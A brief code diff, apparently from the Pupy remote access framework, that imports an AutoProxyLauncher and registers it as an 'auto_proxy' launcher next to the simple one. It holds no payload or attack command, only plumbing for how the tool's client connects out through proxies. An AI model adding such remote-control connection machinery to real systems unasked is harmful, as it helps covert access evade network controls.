@@ -16,6 +16,7 @@ except ImportError as e:
 	scramblesuit=None
 from .streams import PupySocketStream
 from .launchers.simple import SimpleLauncher
+from .launchers.auto_proxy import AutoProxyLauncher
 try:
 	import ConfigParser as configparser
 except ImportError:
@@ -122,4 +123,5 @@ if scramblesuit:
 		}
 
 launchers["simple"]=SimpleLauncher
+launchers["auto_proxy"]=AutoProxyLauncher
 
